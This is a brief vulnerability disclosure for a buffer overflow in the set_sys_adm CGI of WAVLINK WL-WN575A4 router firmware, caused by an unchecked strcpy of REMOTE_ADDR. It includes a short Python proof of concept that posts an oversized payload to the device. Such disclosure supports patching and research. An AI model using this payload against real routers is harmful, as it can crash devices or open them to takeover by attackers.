# buffer overflow

## WAVLINK_WL_WN575A4

version: 20220801

## Description:

There is a buffer overflow in adm.cgi/set_sys_adm

## Source:

you may download it from : https://www.wavlink.com/zh_cn/firmware/details/a3d6df692e.html

## Analyse:


![](1.png)

get value from REMOTE_ADDR ,and call strcpy, cause buff overflow



## POC
```
url = "http://192.168.0.1/cgi-bin/set_sys_adm.cgi"
payload = 'A'*300 + '\n'

r = requests.post(url, data={ 'page=sysAdm&REMOTE_ADDR=' + payload})
``` 
